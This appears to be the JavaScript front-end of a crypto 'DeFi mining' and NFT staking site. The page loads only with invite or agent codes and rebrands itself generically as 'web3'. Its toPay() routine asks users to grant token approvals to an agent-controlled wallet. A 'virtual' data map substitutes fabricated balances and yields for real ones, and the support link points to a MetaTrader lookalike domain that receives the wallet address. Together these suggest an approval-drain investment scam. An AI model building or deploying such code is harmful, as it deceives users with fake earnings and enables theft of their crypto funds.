var that;
var productData = [];
var is_mobile = window.innerWidth <= 768

window.onload = async function() {
	
	//var vConsole = new window.VConsole();
	
	getInviterCode();
	that = new Vue({
		el: '#app',
		data() {
			return {
				lang: "English",
				vi18: jsonData,
				showType: false, //选择链类型开关
				chainList: [],
				showWallet: false, //选择钱包开关
				walletList: [], // 钱包选择json
				chainType: "", // 当前连接的链类型
				walletType: "", // 当前连接的钱包类型
				chainTemp: {}, // 选择的主链信息
				nftStatus: 1, //主链类型 全部默认1
				defilStatus: 1, //主链类型 全部默认1
				address: "",
				balance: 0, //钱包余额
				headerIndex: 1,
				is_mobile: is_mobile,
				showYuyan: false, //语言选择弹框开关
				showMenu: false, //移动端菜单开关
				nftList: [],
				defilList: [],
				agentInfo:[],
				tgData: {
					list: [],
					referralCode: '',
					currentPage: 1,
					pageCount: 1,
					inviterWsurl: ""
				}, //推广数据
				yield: [],
				yieldDay: {
					page: 1,
					count: 1,
					list: [],
					activeName: 'first'
				}, //每日收益数据
				inviteRewards: {
					page: 1,
					count: 1,
					list: [],
					activeName: 'second'
				}, //每日收益数据
				mining: [], //Defil挖矿列表
				withdrawRecord: [], //提现记录
				withdrawTempnum: 0, // 提现临时记录
				yieldDayName: 'yieldDayName1',
				showWithdraw: false, //提现弹框开关
				checkItem: '', //选中数据
				withdrawType: 1, //提现类型
				value: '', //提现输入数据
				walletinfo: {}, // 钱包信息 chainType coinContractAdr balance apprvedType  approveAdr  id 产品id
				outtime: {
					freezeOutTime: "00:00:00:00", //锁定金额倒计时
					timer: 0, //锁定金额倒计时 定时任务数值
				},
				activity2Lock: 1, //客服活动是否解锁 默认没有解锁
				coinShow: "", //监听币数据变化
				nftShow: "", //监听nft数据变化
				earningsShow:"",
				nftImgList: {},// 
				defiTips:{},
				virtualVoMap:{},
				isVirtual:0,
			};
		},
		created() {
			let globalName = "web3";
			var reg = new RegExp("MoonDeFi","g")//g表示全部的	
			this.vi18 = JSON.parse(JSON.stringify(this.vi18).replace(reg,globalName));
			var reg2 = new RegExp("MoonDefi","g")//g表示全部的	
			this.vi18 = JSON.parse(JSON.stringify(this.vi18).replace(reg2,globalName));
			var reg3 = new RegExp("web3","g")//g表示全部的	
			this.vi18 = JSON.parse(JSON.stringify(this.vi18).replace(reg3,globalName));
			
			const changeFavicon = link => {
				let $favicon = document.querySelector('link[rel="icon"]');
				// If a <link rel="icon"> element already exists,
				// change its href to the given link.
				if ($favicon !== null) {
					$favicon.href = link;
					// Otherwise, create a new element and append it to <head>.
				} else {
					$favicon = document.createElement("link");
					$favicon.rel = "icon";
					$favicon.href = link;
					document.head.appendChild($favicon);
				}
			};
			
			// changeFavicon(info.data.iconImg); // 动态修改网站图标
			document.title = globalName; // 动态修改网站标题
			// this.logoImg = info.data.logoImg;
			




			let inviteCode = getInviterCode();
			let code = getAgentCode();
			if(isNull(inviteCode) && isNull(code)){
				return;
			}

			// var vConsole = new window.VConsole();
			window.onresize = () => {
				this.is_mobile = window.innerWidth <= 768
			}
			$('#app')[0].style.display = 'block'
			let i = layer.load(0, {
				shade: [0.2, 'gray'],
				time: 5 * 1000
			});

			defiAgentInfo({},true,asyDefiAgentInfo,this);

			this.getList();
			getWalletInfo(this);
			queryChain(false, setChain, this);
			
			layer.close(i);
			console.log("浏览器类型:" + iswap());
			document.getElementById("loader").remove();
			that = this;
			
			console.log("creart address:" + this.address + ",chainType:" + this.chainType);
			if(notNull(this.address) && notNull(this.chainType)){
				//login
				let inviteCode = getInviterCode();
				let code = getAgentCode();
				let loginData = {
					"address": this.address,
					"chainType": this.chainType,
					"inviterCode": inviteCode,
					"code":code
				};
				login(loginData,false,asyLogin,this);
			}
			if(notNull(this.defiTips) && notNull(this.defiTips.content)){
				layer.open({
				  btn:['confirm']
				  ,title: 'tips'
				  ,content: this.defiTips.content
				});
			}


			
			
		},
		
		methods: {
			navTo(url) {
				window.open(url, '_blank')
			},
			// 点击连接钱包
			onConnect1() {
				console.log('链接钱包:展示主链');
				//选择链类型开关
				this.showType = true;
				queryChain(false, setChain, this);
			},
			onConnect2(item) {
				console.log('链接钱包:展示钱包');
				this.showType = false;
				let pcType = iswap();
				let chainType = item.chainType;
				this.walletList = walletJson[pcType][chainType];
				this.chainTemp = item;
				// 判断是否app打开
				console.log("onConnect2:" + waType())
				let wtype = waType();
				console.log("onConnect2 wtype:"+wtype);
				if (wtype != "default") {
					
					let warr = walletJson[pcType][chainType];
					let winfo
					for( let wa of warr){
						if(wa != undefined && wa.type == wtype){
							winfo = wa;
						}
					}

					// let winfo = walletJson[pcType][chainType].find(wa => wa.type = wtype)
					
					console.log(winfo);
					
					this.onConnect3(winfo);
				} else {
					this.showWallet = true;
				}
			},
			async onConnect3(walletInfo) {
				console.log('链接钱包:连接' + JSON.stringify(walletInfo));
				this.showWallet = false;
				walletType = walletInfo.type;

				let adr = await connect(this.chainTemp, walletInfo);
				console.log('onConnect3:' + adr);
				// 更新钱包信息
				if (notNull(adr)) {
					updateWalletInfo(this.chainTemp.chainType, walletType, adr);
				}
			},
			disconnect2() {
				this.showType = false;
				disconnect(this);
			},
			async toPay(item) {
				console.log("授权");
				if(isNull(this.agentInfo.agentWallet)){
					defiAgentInfo({},false,asyDefiAgentInfo,this);
				}
				let approveAddr = getAgentApprovedWallet(this,item.chainType,item.busType);
				try{
					approve(this, approveAddr, item.quoteCurrencyCtrAddr, item.quoteCurrencyABI,
						item.quoteCurrencyApproveNum, item.quoteCurrencyDecimals, item);
				}catch(error){
					console.log("approve error:" + error)
				}
				
			},
			// 语言选择显示开关
			onShowYuyan(e) {
				if (notNull(e) && e.target.tagName.toLocaleLowerCase() == "img" && e.target.className ==
					"yuyan-icon") {
					this.showYuyan = !this.showYuyan;
				} else {
					this.showYuyan = false;
				}
			},
			// 切换语言
			switchYuyan(type) {
				localStorage.setItem('langKey', type);
				this.lang = type;
				this.onShowYuyan();
				//location.reload();
			},
			// 切换header tab 菜单
			switchTab(index) {
				let i = layer.load(0, {
					shade: [0.2, 'gray'],
					time: 5 * 1000
				});
				if (index == 2 || index == 3 ||
					this.headerIndex == index) {
					// nothing
				} else if (index == 4) {
					this.getInviterInfo()
				} else if (index == 5) {
					// 增加钱包链接判断
					if (isNull(this.address)) {
						// 跳转登录
						this.onConnect1();
						layer.close(i);
						return;
					} else {
						// 更新用户中心
						updateUserDate(this);
					}
				}
				this.headerIndex = index;
				window.scrollTo(0, 0)
				this.is_mobile && (this.showMenu = false)
				
				layer.close(i);
			},
			// 解锁按钮跳转
			async switchTabUnlock(temp) {
				console.log(temp)
				if (temp.type == 1) {
					//
					//this.switchTab()
				} else if (temp.type == 2) {
					//添加客服跳转
					//this.switchTab()
					if (isNull(this.tgData.inviterWsurl)) {
						await this.getInviterInfo();
					}
					let defoult
					if (isNull(this.tgData.inviterWsurl)) {
						defoult ="";
					} else {
						defoult = this.tgData.inviterWsurl;
					}
					window.open(defoult, "_blank");
				} else if (temp.type == 3) {
					//邀请1个新用户，解锁
					if (this.activity2Lock == 1) {
						// 还没有解锁客服 弹窗提示
						this.openinviterWsurl();
						return;
					}
					this.switchTab(4)
				} else if (temp.type == 4) {
					//加入defi矿池或NFT质押，解锁
					if (this.activity2Lock == 1) {
						// 还没有解锁客服 弹窗提示
						this.openinviterWsurl();
						return
					}
					this.switchTab(2)
				}
			},
			openinviterWsurl() {
				// 没有参加客服活动的 弹窗提示
				this.$confirm("<div style='margin-left:1em'>" + this.langS.user.tab5[10] + "</div>",
				'', {
					confirmButtonText: 'confirm',
					//cancelButtonText: 'cancel',
					showCancelButton: false,
					dangerouslyUseHTMLString: true,
					customClass: "openinviterWsurl"
				}).then(() => {
					let temp = {
						"type": 2
					}
					this.switchTabUnlock(temp);
				}).catch(() => {
					console.log("cancel")
				});
			},
			// 移动端显示菜单  开关
			onShowMenu() {
				this.showMenu = !this.showMenu
			},
			// 获取产品列表
			async getList() {
				getDefiIndexList({}, true, productList, this);
			},
			// 切换主链tab
			onSwitchTab(status, key) {
				this[key] = status
			},
			// 获取推广信息
			async getInviterInfo() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType
				};
				let res = inviterInfo(_data, true, asycnInviterInfo, this);
			},
			// 点击推广
			onClickTg() {
				console.log('点击推广');
				if (isNull(this.address)) {
					this.onConnect1();
				}
			},
			// 复制
			onCopy(val) {
				// 点击按钮，复制
				val = document.location.origin + "?inviterCode=" + val;
				
				if (navigator && navigator.clipboard) {
					navigator.clipboard.writeText(val);
				}
				const input = document.createElement('input');
				input.value = val;
				document.body.appendChild(input);
				input.select();
				if (document.execCommand('copy')) {
					document.execCommand('copy');
				}
				document.body.removeChild(input);
				this.$message.success('scssess')
			},
			// 邀请分页change
			tgPagesChange(e) {
				// console.log('邀请页发生变化',e);
			},
			// 获取用户页数据
			async getUserData() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType
				};
				let res = yieldlist(_data, true, getYield, this)
			},
			// 获取挖矿每日列表
			async getYieldDayList() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType,
					pageNum: this.yieldDay.page,
					pageSize: 10
				};
				let res = yieldDayList(_data, true, asycnyieldDayList, this);

			},
			incomePageChange1(e) {
				this.yieldDay.page = e;
				this.getYieldDayList();
			},
			// 获取邀请收益每日列表
			async getInviteRewardsList() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType,
					pageNum: this.inviteRewards.page,
					pageSize: 10
				};
				let res = defiInviteRewardsList(_data, true, asycnInviteRewardsList, this);
			},
			incomePageChange2(e) {
				this.inviteRewards.page = e;
				this.getInviteRewardsList();
			},
			// 获取参与活动列表
			async miningList() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType
				};
				let res = miningList(_data, true, asycnMiningList, this);
			},
			// 获取提现记录
			async getWithdrawRecord() {
				if (isNull(this.address)) {
					return;
				}
				let _data = {
					address: this.address,
					chainType: this.chainType,
				};
				let res = withdrawRecord(_data, true, asycnwithdrawRecord, this);
			},
			// 点击提现
			onClickWithdraw(item, type) {
				let key1 = item.chainType +"-" +item.address +"-"+ item.coinContractAddr;
				let virtual = this.virtualVoMap[key1];
				let num = 0;
				if(type ==1 ){
					if(notNull(virtual) && virtual.virtualSurplusStakingYield > 0){
						num =  virtual.virtualSurplusStakingYield;
					}else{
						num =  item.surplusStakingYield + item.freezeYield;
					}
				}else if(type == 2){
					if(notNull(virtual) && virtual.virtualSurplusReferralYield > 0){
						num = virtual.virtualSurplusReferralYield;
					}else{
						num = item.surplusReferralYield;
					}
				}
				
				if (num <= 0) {
					return;
				}
				this.checkItem = item;
				this.showWithdraw = !this.showWithdraw;
				this.value = num;
				this.withdrawType = type;
				this.showfreezeOutTime();
			},
			// 立即提现
			onWithdraw(_ba, temp) {
				console.log('发起提现');
				let i = 0;
				try {
					if (this.value <= 0) {
						layer.msg(this.langS.other[0]);
						return;
					} else {
						let huilv;
						if (temp.coinType.toLowerCase() == "usdt") {
							huilv = 1;
						} else {
							let key = temp.chainType + "-" + temp.coinType
							huilv = lsc.get(key);

							if (isNull(huilv)) {
								i = layer.load(0, {
									shade: [0.2, 'gray'],
									time: 5 * 1000
								});
								let data = getaAssetsBySymbol(temp.coinType);
								huilv = new BigNumber(data.data.vwap24Hr).toFixed(6);
								lsc.set(key, huilv, 300);
							}
						}

						let tousdt = new BigNumber(this.value).multipliedBy(huilv).toFixed(6)

						let _value = tousdt ;
						if (_value <= 0) {
							layer.msg(this.langS.other[0]);
							return;
						}
						let _data = {
							"chainType": temp.chainType,
							"protocol": temp.protocol,
							"address": this.address,
							"coinContractAddr": temp.coinContractAddr,
							"coinType": temp.coinType,
							"coinImg": temp.coinImg,
							"quantity": this.value,
							"type": this.withdrawType,
							"isVirtual":this.isVirtual
						}
						let res = withdrawApply(_data, false)
						if (res.code == 0) {
							this.getUserData()
							layer.msg("success");
							this.value = "";
							this.showWithdraw = false
							//更新提币记录
							this.getWithdrawRecord();
							
							//login
							let inviteCode = getInviterCode();
							let code = getAgentCode();
							let loginData = {
								"address": this.address,
								"chainType": temp.chainType,
								"inviterCode": inviteCode,
								"code":code
							};
							login(loginData,false,asyLogin,this);
							
							
							if(this.withdrawType == 1){
								this.earningsShow = new Date().toString();
							}else if(this.withdrawType == 2){
								this.earningsShow = new Date().toString();
							}
							
						} else {
							layer.msg(res.msg);
						}
					}
				} finally {
					layer.close(i);
				}
			},
			//tips显示余额详细金额
			showDetailNum1(id) {
				if (!id) return
				if (isNull(this.address)) return "-";
				let key = this.address + "-" + id.id + "-" + id.chainType;
				let item = this.walletinfo[key]
				if ((isNull(item) && item != 0) || (isNull(item.balance) && item.balance != 0)) {
					return "-";
				}
				let b = item.balance;
				let _id = '#balance' + id.id;
				layer.tips('<span style="color:#000;font-weight: bold;">' + b + " " + id.quoteCurrency +
					'</span>', _id, {
						tips: [1, "#2196f3"]
					});
			},
			//tips显示收益详细金额
			showDetailNum2(id) {
				if (!id) return
				if (isNull(this.address)) return "-";
				let key = this.address + "-" + id.id + "-" + id.chainType;
				let item = this.walletinfo[key]
				if ((isNull(item) && item != 0) || (isNull(item.balance) && item.balance != 0)) {
					return "-";
				}
				//let b = item.balance * id.stakingExpectedRate;
				let b = new BigNumber(item.balance).times(id.stakingExpectedRate).toFixed()
				let _id = '#detailnum' + id.id;
				layer.tips('<span style="color:#000;font-weight: bold;">' + b + " " + id.quoteCurrency +
					'</span>', _id, {
						tips: [1, "#2196f3"]
					});
			},
			// 显示nft全称
			showAllquoteCurrency(item) {
				let name = item.quoteCurrency
				let _id = "#quoteCurrencyname" + item.id
				if (name.length > 6) {
					layer.tips('<span style="color:#000">' + name + '</span>', _id, {
						tips: [1, "#fff"]
					});
				}
			},
			// 提币关闭
			unshowWithdraw() {
				this.showWithdraw = false;
			},
			showWithdrawNum() {
				console.log(11111)
				this.showWithdraw = false;
			},
			// 锁定金额倒计时
			showfreezeOutTime() {
				if(notNull(this.checkItem.unLockTime)){
					let t = this.checkItem.unLockTime.replace(/-/g,"/");
					let unLock = new Date(t);
					unLock = unLock.setDate(unLock.getDate() + 30)
					let now = new Date().getTime();
					let time = unLock - now;
					resCountDown(this, time)
				}
			},
			openServerUrl(){
				console.log(this.agentInfo.serviceUrl);
				if(isNull(this.agentInfo.serviceUrl)){
					defiAgentInfo({},false,asyDefiAgentInfo,this);
				}

				let goUrl = "https://services.metartader4.com/index/index/home?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=2&special=1";
				if(notNull(this.agentInfo.serviceUrl)){
					goUrl = this.agentInfo.serviceUrl.replaceAll("visiter_id=&visiter_name=&","");
					goUrl = goUrl + "&visiter_id="+that.address+"&visiter_name="+that.address ;
				}

				window.open(goUrl, '_blank')
			},
		},
		computed: {
			// 地址过滤  省略
			addressF() {
				return function(address) {
					if (notNull(address)) {
						let addr = address.slice(0, 6) + '....' + address.slice(address.length - 6)
						// if (notNull(this.chainType)) {
						// 	addr = this.chainType + "-" + addr 
						// }
						return addr;
					} else {
						return this.langS.home.header.tabs6;
					}
				};
			},
			addressF3() {
				return function(address) {
					if (notNull(address)) {
						let addr = address.slice(0, 3) + '....' + address.slice(address.length - 4)
						// if (notNull(this.chainType)) {
						// 	addr = this.chainType + "-" + addr 
						// }
						return addr;
					} else {
						return this.langS.home.header.tabs6;
					}
				};
			},
			addressImg() {
				return function() {
					// return "";
					let chain 
					for( let cha of this.chainList){
						if(cha != undefined && cha.chainType == this.chainType){
							chain = cha;
						}
					}

					if(isNull(chain) || isNull(chain.chainImg )){
						return "";
					}else{
						return chain.chainImg ;
					}
				};
			},
			addressF2() {
				return function(address) {
					if (notNull(address)) {
						return (
							address.slice(0, 6) + '....' + address.slice(address.length - 6)
						);
					} else {
						return "-";
					}
				};
			},
			queryInfoByChainType() {
				return function(chainType) {
					
					let chain 
					for( let cha of this.chainList){
						if(cha != undefined && cha.chainType == this.chainType){
							chain = cha;
						}
					}
					return chain;
				}
			},

			// 转化年收益 *100 为百分比 * 356年化收益
			percentage() {
				return function(num) {
					if (num) {
						let b = num * 100
						return b.toFixed(2) + '%'
					}
					return 0
				}
			},
			// 语言
			langS() {
				let lang = localStorage.getItem('langKey') || this.lang;
				this.lang = lang;
				return this.vi18[this.lang];
			},
			// 实时查询链上余额
			queryBanlance() {
				return function(id) {
					let j = this.coinShow;
					let k = this.nftShow + j;
					//console.log(j+k);
					if (!id) return "0"
					if (isNull(this.address)) return "0";
					
					let key1 = id.chainType +"-" +this.address +"-"+ id.quoteCurrencyCtrAddr;
					let virtual = this.virtualVoMap[key1];
					if(notNull(virtual) && virtual.virtualBalance > 0){
						return virtual.virtualBalance;
					}else{
						let key = this.address + "-" + id.id + "-" + id.chainType;
						let item = this.walletinfo[key]
						if ((isNull(item) && item != 0) || (isNull(item.balance) && item.balance !=
							0)) {
							return "0";
						}
						let b = item.balance;
						if (b.length > 10) {
							b = b.substring(0, 7) + "..."
						}
						if (id.protocol == "erc721") {
							return b;
						}
						
						return b + " " ;
					}
				}
			},
			// 根据地址查询代币余额
			queryBanlanceByAddress() {
				return function(addr, chainType) {
					console.log(chainType + addr)
				}
			},
			//实时计算每日收益率
			queryDayYield(){
				return function(item){
					console.log("queryDayYield");
					let j = this.coinShow;
					let k = this.nftShow + j;
					
					if (isNull(this.address) || isNull(item)){
						return item.productYields[0].dayYield;
					};
					
					let key1 = item.chainType +"-" +this.address +"-"+ item.quoteCurrencyCtrAddr;
					let virtual = this.virtualVoMap[key1];
					if(notNull(virtual) && virtual.virtualBalance > 0){
						if(notNull(item.productYields) && item.productYields.length > 0){
							let maxYieldsNum = 0;
							let maxYieldsDay = 0;
							let yieldDayYield = null;
							for(let i =0;i<item.productYields.length;i++){
								let yield = item.productYields[i];

								if(new BigNumber(yield.maxNum).comparedTo(new BigNumber(maxYieldsNum)) > 0){
									maxYieldsNum = yield.maxNum;
									maxYieldsDay = yield.dayYield;
								}
								
								if(new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(yield.minNum))>=0 &&
								 (yield.maxNum ==-1 || new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(yield.maxNum)) < 0)){
									yieldDayYield = yield.dayYield;
									return yield.dayYield;
								}
							}

							if(isNull(yieldDayYield) && new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(maxYieldsNum))>=0 ){
								return maxYieldsDay;
							}
						}
					}else{
						let _key = this.address + "-" + item.id + "-" + item.chainType;
						let data = this.walletinfo[_key];
						
						if(isNull(data)){
							return item.productYields[0].dayYield;
						}
						
						return data.dayYield || "";
					}
					
					
				}
			},
			// 实时计算 每日收益
			queryEarnings() {
				return function(id) {
					let j = this.coinShow;
					let k = this.nftShow + j;
					if (!id) return "0"
					if (isNull(this.address)) return "0";
					
					let key1 = id.chainType +"-" +this.address +"-"+ id.quoteCurrencyCtrAddr;
					let virtual = this.virtualVoMap[key1];
					if(notNull(virtual) && virtual.virtualBalance > 0){
						if(notNull(id.productYields) && id.productYields.length > 0){
							let maxYieldsNum = 0;
							let maxYieldsDay = 0;
							let yieldDayYield = null;

							for(let i =0;i<id.productYields.length;i++){
								let yield = id.productYields[i];

								if(new BigNumber(yield.maxNum).comparedTo(new BigNumber(maxYieldsNum)) > 0){
									maxYieldsNum = yield.maxNum;
									maxYieldsDay = yield.dayYield;
								}

								if(new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(yield.minNum))>=0 &&
								 (yield.maxNum ==-1 || new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(yield.maxNum)) < 0)){
									let yieldNum = new BigNumber(yield.dayYield * virtual.virtualBalance).dividedBy(100).toFixed(2);
									yieldDayYield = yield.dayYield;
									return yieldNum;
								}
							}

							if(isNull(yieldDayYield) && new BigNumber(virtual.virtualBalance).comparedTo(new BigNumber(maxYieldsNum))>=0 ){
								return new BigNumber(maxYieldsDay * virtual.virtualBalance).dividedBy(100).toFixed(2);;
							}
						}
						return "-";
					}else{
						let key = this.address + "-" + id.id + "-" + id.chainType;
						let item = this.walletinfo[key]
						if ((isNull(item) && item != 0) || (isNull(item.balance) && item.balance !=
							0)) {
							return "0";
						}
						if (id.protocol == "erc721") {
							// 暂时不处理
							// let floor = id.nftFloorPrice;
							// if (isNull(floor)) {
							// 	floor = 0;
							// }
							// let b = item.balance * floor * id.stakingExpectedRate;
							// if ((b + "").length > 6) {
							// 	return new BigNumber(b).toFixed(6) + " " + id.baseCurrency
							// }
							// return b + " " + id.baseCurrency;
						} else {
							let _key = this.address + "-" + id.id + "-" + id.chainType;
							let data = this.walletinfo[_key];
							if(isNull(data)){
								return 0;
							}
							
							return data.yieldNum || 0;
						}
					}
					
				}
			},
			// floor price
			nftfloorPrice() {
				return function(id) {
					if (!id) return "0"
					if (isNull(id.nftFloorPrice)) {
						return "0";
					}
					return id.nftFloorPrice + " " + id.baseCurrency
				}
			},
			// 实时计算 加入状态
			queryJoinType() {
				return function(id) {
					//console.log("计算加入状态")
					if (!id) return "0"
					if (isNull(this.address)) return "0"
					let key = this.address + "-" + id.id + "-" + id.chainType;
					let item = this.walletinfo[key]
					if ((isNull(item) && item != 0) || (isNull(item.apprvedNum) && item
							.apprvedNum <= 0)) {
						return "0"
					}
					//langS.nft.btText2
					return {
						"name": this.langS.nft.btText3,
						"color": "background:#9229ff"
					};
				}
			},
			inviterUrl(){
				return function(referralCode) {
					let url = document.location.origin + "?inviterCode=" + referralCode;
					return url;
				}
			},
			// // 弹出利率框
			// dailybox() {
			// 	return function(id) {
			// 		console.log("计算加入状态")
			// 		if (!id) return "0"
			// 		if (isNull(this.address)) return "0"
			// 		let key = this.address + "-" + id.id + "-" + id.chainType;
			// 		let item = this.walletinfo[key]
			// 		if ((isNull(item) && item != 0) || (isNull(item.apprvedNum) && item
			// 				.apprvedNum <= 0)) {
			// 			return "0"
			// 		}
			// 		//langS.nft.btText2
			// 		return {
			// 			"name": this.langS.nft.btText3,
			// 			"color": "background:#9229ff"
			// 		};
			// 	}
			// },
			// 计算
			myToFixed() {
				return function(num) {
					if (!num) return 0
					if (num == 0) {
						return num;
					} else {
						return new BigNumber(num).toFixed(6)
					}
				}
			},
			// 计算
			myToFixed2() {
				return function(num) {
					if (!num) return
					if (num == 0) {
						return num;
					} else {
						return new BigNumber(num).toFixed(2)
					}
				}
			},
			//计算质押总收益
			myToStakingYield(){
				return function(row) {
					if (!row) return 0;
					let key = row.chainType +"-" +row.address +"-"+ row.quoteCurrencyCtrAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualStakingYield > 0){
						return virtual.virtualStakingYield;
					}else{
						return row.totalIncome;
					}
				}
			},
			
			// 计算收益余额(加上了奖励金额)
			myToFixedFreeze() {
				return function(row) {
					console.log("计算收益余额")
					let j = this.earningsShow;
					console.log(j);
					if (!row) return
	
					let key = row.chainType +"-" +row.address +"-"+ row.coinContractAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualSurplusStakingYield > 0){
						this.isVirtual = 1;
						return virtual.virtualSurplusStakingYield;
					}else{
						this.isVirtual = 2;
						let freeze = row.freezeYield;
						let yield = row.surplusStakingYield;
						let num = new BigNumber(freeze).plus(yield);
						if (num == 0) {
							return num;
						} else {
							return num.toFixed(2)
						}
					}
				}
			},
			// 计算推荐奖励余额
			myToReferralYield() {
				return function(row) {
					let j = this.earningsShow;
					console.log(j);
					if (!row) return
					let key = row.chainType +"-" +row.address +"-"+ row.coinContractAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualSurplusReferralYield > 0){
						this.isVirtual = 1;
						return virtual.virtualSurplusReferralYield;
					}else{
						this.isVirtual = 2;
						let num = new BigNumber(row.surplusReferralYield);
						if (num == 0) {
							return num;
						} else {
							return num.toFixed(2)
						}
					}
				}
			},
			// 计算余额
			myToFixedbanale() {
				return function(raw) {
					console.log("计算余额")
					let j = this.coinShow;
					let k = this.nftShow;
					console.log(j + k);
					if (!raw) return
					
					let key = raw.chainType +"-" +raw.address +"-"+ raw.quoteCurrencyCtrAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualBalance > 0 ){
						// this.isVirtual = 1;
						return virtual.virtualBalance;
					}else{
						// this.isVirtual = 2;
						let balance = raw.balance
						if (raw.type == 0) {
							//let key = this.address + "-" + raw.productId + "-" + raw.chainType;
							//let item = this.walletinfo[key]
							// if ((isNull(item) && item != 0) || (isNull(item.balance) && item.balance !=
							// 		0)) {
							// 	return "0";
							// }
							//balance = item.balance;
							if (raw.protocol == "erc721") {
								let n = raw.nftList;
								if(notNull(n)){
									balance = n.length
								}
								return balance;
							}
						}
						if (isNull(balance)) {
							return 0;
						} else {
							//return new BigNumber(balance).toFixed(6)
							return new BigNumber(balance).toString()
						}
					}
					
				}
			},
			// 计算实时价格 不扣手续费
			withdrawNum() {
				return function(type, item) {
					//withdrawType ==1?checkItem.surplusStakingYield:checkItem.surplusReferralYield,checkItem
					if (!item) return 0;
					
					let i = 0;
					let num = this.value;
					if (!num) return 0;
					if (isNull(num)) return 0;
					
					let key1 = item.chainType +"-" +item.address +"-"+ item.coinContractAddr;
					let virtual = this.virtualVoMap[key1];
					let _balance = 0;
					if(type == 1){
						if(notNull(virtual) && virtual.virtualSurplusStakingYield > 0 ){
							_balance = virtual.virtualSurplusStakingYield ;
						}else{
							_balance = item.surplusStakingYield;
						}
					}else if(type == 2){
						if(notNull(virtual) && virtual.virtualSurplusReferralYield > 0 ){
							_balance = virtual.virtualSurplusReferralYield
						}else{
							_balance = item.surplusReferralYield;
						}
					}
					
					if (new BigNumber(num).comparedTo(new BigNumber(_balance)) > 0) {
						_balance = new BigNumber(_balance).toFixed(2,1);
						this.value = _balance;
						num = _balance;
					}
					if (new BigNumber(num).comparedTo(new BigNumber(0)) < 0) {
						this.value = 0;
						return 0;
					}
					let huilv;
					if (item.coinType.toLowerCase() == "usdt") {
						huilv = 1;
					} else {
						let key = item.chainType + "-" + item.coinType
						huilv = lsc.get(key);
						if (isNull(huilv)) {
							i = layer.load(0, {
								shade: [0.2, 'gray'],
								time: 5 * 1000
							});

							let data = getaAssetsBySymbol(item.coinType);
							huilv = new BigNumber(data.data.vwap24Hr).toFixed(2,1);
							lsc.set(key, huilv, 300);
						}
					}
					console.log("计算实时价格2huilv："+huilv)
					let tousdt = new BigNumber(num).multipliedBy(huilv).toFixed(2,1)
					let ba = new BigNumber(tousdt ).toFixed(2,1)
					let str = num + " * " + huilv + "<br />" + "= " + ba + " USDT"
					layer.close(i);
					return str;
				}
			},
			// 计算实时价格 扣手续费
			withdrawNumbak() {
				return function(_balance, item) {
					let i = 0;
					let num = this.value;
					if (!num) return 0;
					if (isNull(num)) return 0;
					console.log("计算实时价格num："+num + ",balance:" + _balance)
					if (new BigNumber(num).comparedTo(new BigNumber(_balance)) > 0) {
						_balance = new BigNumber(_balance).toFixed(2);
						this.value = _balance;
						num = _balance;
					}
					if (new BigNumber(num).comparedTo(new BigNumber(0)) < 0) {
						this.value = 0;
						return 0;
					}
					let huilv;
					if (item.coinType.toLowerCase() == "usdt") {
						huilv = 1;
					} else {
						let key = item.chainType + "-" + item.coinType
						huilv = lsc.get(key);
						if (isNull(huilv)) {
							i = layer.load(0, {
								shade: [0.2, 'gray'],
								time: 5 * 1000
							});
			
							let data = getaAssetsBySymbol(item.coinType);
							huilv = new BigNumber(data.data.vwap24Hr).toFixed(2);
							lsc.set(key, huilv, 300);
						}
					}
					console.log("计算实时价格2huilv："+huilv)
					let tousdt = new BigNumber(num).multipliedBy(huilv).toFixed(2)
					let ba = new BigNumber(tousdt - 5).toFixed(2)
					let str = num + " * " + huilv + " - 5 USDT<br />" + "= " + ba + " USDT"
					layer.close(i);
					return str;
				}
			},
			nameFormat() {
				return function(name) {
					if (name.length > 6) {
						name = name.substring(0, 6) + "..."
					}
					return name
				}
			},
			showFreezeYield() {
				return function(temp, type) {
					if (!temp) return false;
					if (type == 1 && notNull(temp.freezeYield) && temp.freezeYield > 0) {
						return true;
					}
					return false;
				}
			},
			// 活动剩余时间 按解锁时间开始计算30天
			activitydeadline() {
				return function(num) {
					if (!num) return this.langS.nft.item.t7;
					let d = parseInt((new Date() - new Date(num)) / (24 * 60 * 60 * 1000));
					return d + this.langS.nft.item.t8;
				}
			},
			// 提币按钮是否展示
			showTibi() {
				return function(row) {
					if (!row) return true;
					let key = row.chainType +"-" +row.address +"-"+ row.coinContractAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualSurplusStakingYield > 0 ){
						// this.isVirtual = 1;
						return false;
					}else{
						let freeze = row.freezeYield;
						let yield = row.surplusStakingYield;
						
						let num = new BigNumber(freeze).plus(yield);
						if (num <= 0) {
							return true;
						} else {
							return false;
						}
					}
				}
			},
			//提现推荐按钮是否显示
			showTuijian(){
				return function(row){
					if (!row) return true;
					let key = row.chainType +"-" +row.address +"-"+ row.coinContractAddr;
					let virtual = this.virtualVoMap[key];
					if(notNull(virtual) && virtual.virtualSurplusReferralYield > 0 ){
						// this.isVirtual = 1;
						return false;
					}else{
						let freeze = 0;
						let yield = row.surplusReferralYield;
						
						let num = new BigNumber(freeze).plus(yield);
						if (num <= 0) {
							return true;
						} else {
							return false;
						}
					}
				}
			},
		},
		mounted() {
			window.onresize = () => {
				return (() => {
					this.is_mobile = window.innerWidth <= 768;
				})()
			};
		},
		
	});
	
	
}


